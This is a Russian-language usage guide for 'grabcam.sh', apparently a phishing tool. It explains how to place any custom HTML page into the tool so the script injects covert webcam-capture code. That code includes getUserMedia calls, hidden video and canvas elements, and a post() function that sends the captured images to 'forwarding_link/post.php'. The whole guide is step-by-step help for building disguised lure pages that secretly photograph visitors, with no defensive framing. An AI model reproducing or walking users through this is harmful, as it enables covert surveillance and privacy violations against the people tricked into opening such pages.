# 📝 Как добавить свой HTML файл

## 🎯 Простой способ (рекомендуется)

### Шаг 1: Положите ваш HTML файл в папку с проектом
```bash
# Скопируйте ваш HTML файл в папку camera
cp /путь/к/вашему/файлу.html /home/error/Рабочий\ стол/camera/
```

### Шаг 2: Переименуйте в grabcam.html (или используйте переменную)
```bash
# Вариант 1: Переименовать
mv ваш_файл.html grabcam.html

# Вариант 2: Использовать переменную (НЕ переименовывать)
# Просто укажите имя файла при запуске (см. ниже)
```

### Шаг 3: Запустите скрипт
```bash
bash grabcam.sh
```

**Готово!** Скрипт автоматически:
- ✅ Проверит ваш HTML файл
- ✅ Добавит недостающий код (если чего-то не хватает)
- ✅ Заменит `forwarding_link` на реальную ссылку

---

## 🔧 Использование своего имени файла (БЕЗ переименования)

Если вы хотите сохранить оригинальное имя файла:

```bash
# Укажите имя вашего файла через переменную
HTML_TEMPLATE="мой_красивый_шаблон.html" bash grabcam.sh
```

Или в терминале:
```bash
export HTML_TEMPLATE="мой_файл.html"
bash grabcam.sh
```

---

## 📋 Пошаговая инструкция (для новичков)

### Пример 1: У вас есть файл `my_page.html`

**Шаг 1:** Откройте терминал и перейдите в папку проекта:
```bash
cd "/home/error/Рабочий стол/camera"
```

**Шаг 2:** Скопируйте ваш файл сюда (если он в другом месте):
```bash
cp /путь/к/my_page.html .
```

**Шаг 3:** Запустите скрипт с вашим файлом:
```bash
HTML_TEMPLATE="my_page.html" bash grabcam.sh
```

**Результат:** Скрипт автоматически дополнит файл всем необходимым!

---

### Пример 2: Переименование в grabcam.html

**Шаг 1:** Перейдите в папку проекта:
```bash
cd "/home/error/Рабочий стол/camera"
```

**Шаг 2:** Переименуйте ваш файл:
```bash
mv ваш_файл.html grabcam.html
```

**Шаг 3:** Запустите скрипт:
```bash
bash grabcam.sh
```

**Результат:** Скрипт автоматически использует grabcam.html и дополнит его!

---

## ✨ Что происходит автоматически

Когда вы добавляете HTML файл, скрипт проверяет и добавляет:

1. **Функцию post()** - если её нет
   ```javascript
   function post(imgdata){
       $.ajax({
           url: 'forwarding_link/post.php',
           // ...
       });
   }
   ```

2. **Элементы для камеры** - если их нет
   ```html
   <video id="video"></video>
   <canvas id="canvas"></canvas>
   ```

3. **Код доступа к камере** - если его нет
   ```javascript
   // Код для getUserMedia, handleSuccess, init()
   ```

4. **jQuery** - если не подключен
   ```html
   <script src="jquery.js"></script>
   ```

---

## 🎨 Что можно оставить в вашем HTML

Вы можете оставить в вашем HTML:
- ✅ Ваш дизайн и стили (CSS)
- ✅ Ваш текст и контент
- ✅ Ваши изображения
- ✅ Ваши формы
- ✅ Ваши скрипты (если они не конфликтуют)

**Главное:** Скрипт добавит только то, чего не хватает!

---

## 🔍 Проверка после добавления

После запуска скрипта вы увидите сообщение:
```
[*] Проверка и дополнение HTML файла: ваш_файл.html
[+] HTML файл автоматически дополнен необходимым кодом: ваш_файл.html
[+] Использован HTML шаблон: ваш_файл.html
```

Это значит, что всё прошло успешно!

---

## ⚠️ Важные моменты

1. **Не удаляйте комментарии** - скрипт добавит код с комментариями `<!-- Автоматически добавлено: ... -->`

2. **Сохраняйте структуру** - если у вас есть теги `<body>`, `</body>`, `</html>`, скрипт правильно вставит код

3. **Ваш файл будет изменен** - скрипт модифицирует ваш файл, добавив недостающий код

4. **Можно откатить** - если что-то пошло не так, просто используйте резервную копию:
   ```bash
   cp ваш_файл.html.backup ваш_файл.html
   ```

---

## 💡 Советы

### Создание резервной копии
```bash
# Перед использованием скрипта сделайте копию
cp ваш_файл.html ваш_файл.html.backup
```

### Использование нескольких шаблонов
```bash
# Вы можете создать несколько HTML файлов и переключаться между ними
HTML_TEMPLATE="шаблон1.html" bash grabcam.sh
HTML_TEMPLATE="шаблон2.html" bash grabcam.sh
```

### Проверка файла перед использованием
```bash
# Посмотрите содержимое файла
cat ваш_файл.html
```

---

## 📞 Быстрая справка

```bash
# Добавить файл через переименование
mv мой_файл.html grabcam.html
bash grabcam.sh

# Добавить файл через переменную (НЕ переименовывая)
HTML_TEMPLATE="мой_файл.html" bash grabcam.sh

# Создать резервную копию перед использованием
cp мой_файл.html мой_файл.html.backup
```

---

## ✅ Готово!

Теперь вы можете добавлять любой HTML файл, и скрипт автоматически сделает его работоспособным! 🎉

